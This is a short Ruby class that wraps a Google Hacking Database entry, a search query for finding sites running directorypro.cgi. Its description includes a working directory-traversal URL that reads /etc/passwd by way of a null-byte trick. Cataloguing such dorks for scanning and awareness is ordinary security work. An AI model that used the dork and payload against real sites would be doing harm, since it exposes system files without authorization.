module Dorks
   class Dork692 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 692",
            ghdb_url: "https://www.exploit-db.com/ghdb/692",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2004-11-18",
            author: "anonymous",
            dork: <<~EDORK,
inurl:directorypro.cgi
EDORK
            description: <<~EDESC
A security vulnerability in the product allows attackers to perform a directory traversal attack and access files that reside outside the normal HTTP root directory.http://target/cgi-bin/directorypro.cgi?want=showcat&show=../../../../etc/passwd%00http://www.securityfocus.com/bid/2793
EDESC
         })

      end
   end
end
